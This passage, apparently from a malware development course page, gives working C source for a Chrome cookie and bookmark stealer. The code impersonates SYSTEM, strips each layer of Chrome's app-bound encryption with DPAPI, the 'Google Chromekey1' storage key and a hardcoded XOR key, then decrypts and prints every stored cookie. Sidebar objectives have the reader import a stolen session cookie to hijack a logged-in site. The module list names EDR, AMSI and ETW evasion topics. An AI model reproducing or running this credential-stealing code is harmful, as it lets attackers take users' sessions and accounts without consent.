<p>Moving on to the next encryption layer, we need to stop impersonating <code>SYSTEM</code> by calling the <code>RevertToSelf</code> function. This will allow us to decrypt the key descriptor using the <code>CryptProtectData</code> function, but this time as the user. At this point, the key descriptor has been decrypted.</p>
<p>We skip the verification data and extract the AES-256-GCM key, nonce,
 and the encrypted app-bound key. Unfortunately, the AES key itself is 
under two layers of encryption which we must remove in order to decrypt 
the app-bound key.</p>
<p>To remove the first layer of encryption, we use a special cryptographic key called <code>Google Chromekey1</code>, which is stored in the Microsoft Software Key Storage Provider. This key can only be accessed by the <code>SYSTEM</code> user, so we must impersonate the system token again. The helper function <code>DecryptUsingChromeKey</code> handles this step and will be explained later. After decrypting with <code>Google Chromekey1</code>, the AES key is XOR-ed it with a fixed key to complete the key derivation.</p>
<p>Finally, the fully decrypted AES key is used to decrypt the app-bound
 key using AES-256-GCM. If the decryption is successful, the resulting 
app-bound key is copied into the <code>DecryptedKey</code> output buffer. At this point, we have everything we need to decrypt Chrome secrets.</p>
<pre><code class="language-C">CONST UCHAR XorKey[] = { 0xCC, 0xF8, 0xA1,
 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06,
 0x1C, 0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4,
 0xB7, 0x5C, 0x39, 0x23, 0x90 };

BOOLEAN DecryptAppBoundKey(_In_ PUCHAR AppBoundKey, _In_ ULONG 
AppBoundKeySize, _Out_ PUCHAR DecryptedKey)
{
    DATA_BLOB EncryptedKey;
    DATA_BLOB UserKey;
    DATA_BLOB Key = { 0 };
    PUCHAR    AesKey;
    PUCHAR    Nonce;
    PUCHAR    Ciphertext;
    PUCHAR    Tag;
    BOOLEAN   Result;
    HANDLE    SystemToken;

    SystemToken = GetSystemToken();

    if (SystemToken == 0)
    {
        return 0;
    }

    do
    {
        //
        // Decrypt the data as SYSTEM
        //

        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        EncryptedKey.pbData = AppBoundKey;
        EncryptedKey.cbData = AppBoundKeySize;

        Result = CryptUnprotectData(&amp;EncryptedKey, 0, 0, 0, 0, 0, 
&amp;UserKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as SYSTEM\n");
            break;
        }

        //
        // Decrypt the data as the user
        //

        Result = CryptUnprotectData(&amp;UserKey, 0, 0, 0, 0, 0, 
&amp;Key);
        LocalFree(UserKey.pbData);

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as the Chrome 
user\n");
            break;
        }

        //
        // Skip over the verification data and get the (encrypted) AES 
key used to encrypt the app-bound key
        //

        AesKey = *(PULONG)Key.pbData + (Key.pbData + sizeof(ULONG)) + 
sizeof(ULONG) + 1;
        Nonce = AesKey + 32;         // AES-256-GCM nonce used when 
encrypting the app-bound key
        Ciphertext = Nonce + 12;     // Encrypted app-bound key
        Tag = Ciphertext + 32;       // AES-256-GCM tag used when 
encrypting the app-bound key

        //
        // Decrypt the AES key using Chrome's CNG. We also need to be 
system to access it.
        //
        
        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        Result = DecryptUsingChromeKey(AesKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            break;
        }

        for (UCHAR Index = 0; Index &lt; 32; Index++)
        {
            AesKey[Index] ^= XorKey[Index];
        }

        //
        // Use the decrypted AES key to decrypt the app-bound key
        //

        Result = Aes256GcmDecrypt(AesKey, 32, Nonce, 12, Tag, 16, 
Ciphertext, 32);

        if (Result == TRUE)
        {
            RtlCopyMemory(DecryptedKey, Ciphertext, 32);
        }

    } while (FALSE);

    if (Key.pbData != 0)
    {
        LocalFree(Key.pbData);
    }

    CloseHandle(SystemToken);
    return Result;
}
</code></pre>
<br>
<h4>The DecryptUsingChromeKey Function</h4>
<p>The <code>DecryptUsingChromeKey</code> function is used to decrypt 
the 32-byte AES-256-GCM key using the Chrome key stored in the Microsoft
 Key Storage Provider (KSP). The KSP API allows applications to easily 
manage cryptographic keys in a secure manner. Since the Chrome key is 
stored in the system KSP, we need to run as the <code>SYSTEM</code> user in order to access it.</p>
<p>First, the function opens the Microsoft KSP using <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptopenstorageprovider">NCryptOpenStorageProvider</a>, and then it opens the <code>Google Chromekey1</code> key from this provider using <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptopenkey">NCryptOpenKey</a>. If the key is opened successfully, the function calls <a href="https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptdecrypt">NCryptDecrypt</a> to decrypt the 32-byte ciphertext in place using the opened key.</p>
<pre><code class="language-C">BOOLEAN DecryptUsingChromeKey(_In_ PUCHAR Ciphertext)
{
    NCRYPT_PROV_HANDLE ProviderHandle;
    NCRYPT_KEY_HANDLE  KeyHandle;
    ULONG              BytesDecrypted;
    SECURITY_STATUS    Status;

    //
    // Open the storage provider
    //

    Status = NCryptOpenStorageProvider(&amp;ProviderHandle, L"Microsoft Software Key Storage Provider", 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open key storage provider: 0x%08lX\n", Status);
        return FALSE;
    }

    //
    // Open the Chrome key from the storage provider
    //

    Status = NCryptOpenKey(ProviderHandle, &amp;KeyHandle, L"Google Chromekey1", 0, 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open the Google Chromekey1 key: 0x%08lX\n", Status);
        NCryptFreeObject(ProviderHandle);
        return FALSE;
    }

    //
    // Decrypt the ciphertext
    //
    
    Status = NCryptDecrypt(KeyHandle, Ciphertext, 32, 0, Ciphertext, 32, &amp;BytesDecrypted, NCRYPT_SILENT_FLAG);
    NCryptFreeObject(KeyHandle);
    NCryptFreeObject(ProviderHandle);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Failed decrypting the app-bound key using the Chromekey1 key: 0x%08lX\n", Status);
        return FALSE;
    }

    return TRUE;
}
</code></pre>
<br>
<h3>Dumping Chrome Cookies</h3>
<p>Equipped with the app-bound key, we can dump Chrome's cookies using the <code>DumpChromeCookies</code> function, which takes in a single parameter, <code>AppBoundKey</code>, which is the AES key used to encrypt Chrome secrets.</p>
<p>The function starts by using the SQLite API to open a handle to the database in which Chrome stores cookies, found at <code>Google\Chrome\User Data\Default\Network\Cookies</code>.
 Then, it will execute a SQL query that pulls key cookie attributes, 
including host, path, name, expiration time in local date-time format, 
the encrypted cookie data, and its length.</p>
<p>Once the query has finished executing, the SQLite API will call the <code>CookiesSqlCallback</code>
 callback, which will print all this data to the console. The cookie's 
value will be decrypted and printed using the previously created <code>PrintChromeSecret</code> function. As the length of the cookie's value is provided as the fifth parameter in string format, we must use the <code>strotoul</code> function to convert it to an integer.</p>
<pre><code class="language-C">CONST CHAR CookiesSqlQuery[] = "SELECT 
host_key, path, name, datetime((expires_utc / 1000000) - 11644473600, 
'unixepoch', 'localtime'), encrypted_value, length(encrypted_value) from
 cookies;";

INT CookiesSqlCallback(PVOID AppBoundKey, INT Argc, PCHAR* Argv, PCHAR* 
ColumnName)
{
    wprintf(L"- URL: %hS\n", Argv[0]);
    wprintf(L"- Path: %hS\n", Argv[1]);
    wprintf(L"- Name: %hS\n", Argv[2]);
    wprintf(L"- Expires: %hS\n", Argv[3]);

    PrintChromeSecret((PUCHAR)AppBoundKey, (PUCHAR)Argv[4], 
strtoul(Argv[5], 0, 10));
    return 0;
}

VOID DumpChromeCookies(_In_ PUCHAR AppBoundKey)
{
    PrintCookiesBanner();

    //
    // Open the "Cookies" database file
    //

    sqlite3* CookiesDatabase;
    ULONG    Result;

    Result = sqlite3_open_v2("Google\\Chrome\\User 
Data\\Default\\Network\\Cookies", &amp;CookiesDatabase, 
SQLITE_OPEN_READONLY, 0);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Error opening the cookies database: %hS\n", 
sqlite3_errmsg(CookiesDatabase));
        return;
    }

    //
    // Execute a query that will retrieve the cookies
    //

    PCHAR ErrorMessage;
    Result = sqlite3_exec(CookiesDatabase, CookiesSqlQuery, 
CookiesSqlCallback, AppBoundKey, &amp;ErrorMessage);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Failed querying the logins table of the database: 
%hS\n", ErrorMessage);
        sqlite3_free(ErrorMessage);
    }

    sqlite3_close_v2(CookiesDatabase);
}
</code></pre>
<br>
<h3>Dumping Chrome Bookmarks</h3>
<p>Bookmarks are stored in the <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks</code> file in JSON. Let us examine a sample <code>Bookmarks</code> file:</p>
<pre><code>{
   "checksum": "aa500b04b960dc8fea4471baa1d54699",
   "roots": {
      "other": {
         "children": [ {
            "date_added": "13402846428966999",
            "date_last_used": "0",
            "guid": "dc0ec706-5ab7-4cf5-a67b-b282582ae666",
            "id": "5",
            "meta_info": {
               "power_bookmark_meta": ""
            },
            "name": "Maldev Academy - Advanced Training for Cyber Security Professionals",
            "type": "url",
            "url": "https://maldevacademy.com/"
         }, {
            "date_added": "13402846642600565",
            "date_last_used": "0",
            "guid": "8e37a94b-913c-4a4c-b188-d04c81e6bbe3",
            "id": "7",
            "meta_info": {
               "power_bookmark_meta": ""
            },
            "name": "DuckDuckGo",
            "type": "url",
            "url": "https://duckduckgo.com/"
         } ],
         "date_added": "13402846422837141",
         "date_last_used": "0",
         "date_modified": "13402848226097737",
         "guid": "82b081ec-3dd3-529c-8475-ab6c344590dd",
         "id": "2",
         "name": "Other bookmarks",
         "type": "folder"
      },
   },
   "version": 1
}
</code></pre>
<p>We see that there is a <code>name</code> and <code>url</code> attribute for each bookmark saved by Chrome. As such, we can dump bookmarks by simply printing the value of each <code>name</code> and <code>url</code> pair.</p>
<p>This process is encapsulated in the <code>DumpChromeBookmarks</code> function. First, it reads the JSON file containing the bookmarks using the <code>ReadFileContents</code> helper. Then, in a <code>for</code> loop, it uses <code>strstr</code> to iterate over all instances of the <code>"name": </code> string, signifying the presence of a <code>name</code>
 attribute. As the value of this attribute is enclosed in quotation 
marks, its size can be determined by scanning for the closing quotation 
mark. After that, the function uses <code>strstr</code> again to find the next <code>"url": </code> string, which represents the corresponding <code>url</code> attribute. Finally, the name and URL of the bookmark are printed to the screen.</p>
<pre><code class="language-C">VOID DumpChromeBookmarks()
{
    PrintBookmarksBanner();

    PSTR  BookmarksJson;
    PSTR  Name;
    ULONG NameSize;
    PSTR  Url;
    ULONG UrlSize;

    //
    // Read the bookmarks JSON file
    //

    BookmarksJson = (PSTR)ReadFileContents((PWCHAR)L"Google\\Chrome\\User Data\\Default\\Bookmarks", 0);

    if (BookmarksJson == 0)
    {
        return;
    }

    for (Name = strstr(BookmarksJson, "\"name\":"); Name != 0; Name = strstr(Url, "\"name\""))
    {
        Name    += sizeof("\"name\": ");
        NameSize = strchr(Name, '"') - Name;

        Url = strstr(Name + NameSize, "\"url\":");

        if (Url == 0)
        {
            break;
        }

        Url    += sizeof("\"url\": ");
        UrlSize = strchr(Url, '"') - Url;

        //
        // Print the name and URL of the bookmark
        // 

        wprintf(L"- Name: %.*hS\n",  NameSize, Name);
        wprintf(L"- URL: %.*hS\n\n", UrlSize,  Url);

        //
        // Continue the search after this URL
        //

        Url += UrlSize + sizeof('"');
    }

    HeapFree(GetProcessHeap(), 0, BookmarksJson);
}
</code></pre>
<p>In order to add this functionality to our tool, we simply need to call <code>DumpChromeBookmarks</code> anywhere after setting the current working directory to the <code>AppData\Local</code> folder.</p>
<h3>The Main Function</h3>
<p>Putting it all together, we obtain the path to the user's <code>AppData\Local</code>
 folder, set it as the current working directory and read the local 
state file to extract the app-bound encryption key. If this is 
successful, we will use <code>DumpChromeCookies</code> and <code>DumpChromeBookmarks</code> to dump Chrome's cookies and bookmarks.</p>
<pre><code class="language-C">INT main()
{
    //
    // Get the path to the AppData\Local folder
    //

    HRESULT Result;
    PWSTR   AppDataPath;
    PUCHAR  LocalState;
    UCHAR   AppBoundKey[32];

    Result = SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, 0, &amp;AppDataPath);

    if (FAILED(Result))
    {
        wprintf(L"Could not get the path of the AppData folder: %lu\n", Result);
        return -1;
    }

    //
    // Set it as the current working directory
    //

    SetCurrentDirectoryW(AppDataPath);
    CoTaskMemFree(AppDataPath);        // Free the memory allocated by SHGetKnownFolderPath

    //
    // Get the app-bound encryption key
    //

    LocalState = ReadFileContents((PWCHAR)L"Google\\Chrome\\User Data\\Local State", 0);

    if (LocalState == 0)
    {
        return -1;
    }

    Result = ExtractAppBoundKey((PSTR)LocalState, AppBoundKey);
    HeapFree(GetProcessHeap(), 0, LocalState);

    if (Result == FALSE)
    {
        return -1;
    }

    //
    // Dump the chrome cookies and bookmarks
    //

    DumpChromeCookies(AppBoundKey);
    DumpChromeBookmarks(); 
    return 0;
}
</code></pre>
<h3>Demo</h3>
<img src="81_files/Demo-3.png" style="margin:auto" width="800px">

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Log into a website of your choice using Chrome and use the provided tool to extract the cookies</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Open
 the website again in an incognito tab and use Chrome's Developer Tools 
to import the extracted session cookie and refresh the page</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="81_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
